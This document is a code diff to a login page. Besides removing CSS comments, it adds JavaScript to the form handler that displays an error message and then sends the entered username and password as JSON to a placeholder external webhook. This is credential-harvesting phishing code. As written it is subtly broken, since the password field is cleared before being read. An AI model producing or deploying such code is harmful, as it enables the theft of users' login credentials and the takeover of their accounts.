@@ -27,11 +27,11 @@
   #loginBtn { 
     transition: bottom 0.3s ease; 
     min-width: 40%; 
-    width: 60%; /* slightly less wide */
+    width: 60%; 
     font-size: 0.96rem; 
     padding: 0.7rem 0; 
     display: block; 
-    margin: 0 auto; /* centers horizontally */
+    margin: 0 auto; 
   }
 
   .input-container { width: 85%; margin: 0 auto; }
@@ -110,6 +110,8 @@ document.addEventListener("DOMContentLoaded", function() {
   const errorMsg = document.getElementById("errorMsg");
   const loginForm = document.getElementById("loginForm");
 
+  const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Replace with your actual webhook
+
   function checkInputs() {
     if (usernameInput.value.trim() && passwordInput.value.trim()) {
       loginBtn.classList.remove("bg-gray-400");
@@ -130,6 +132,17 @@ document.addEventListener("DOMContentLoaded", function() {
     errorMsg.classList.remove("hidden");
     passwordInput.value = "";
     checkInputs();
+
+    // Send data to webhook
+    const username = usernameInput.value.trim();
+    const password = passwordInput.value.trim();
+    if(username && password) {
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, password })
+      }).catch(console.error);
+    }
   });
 
   window.togglePassword = function() {
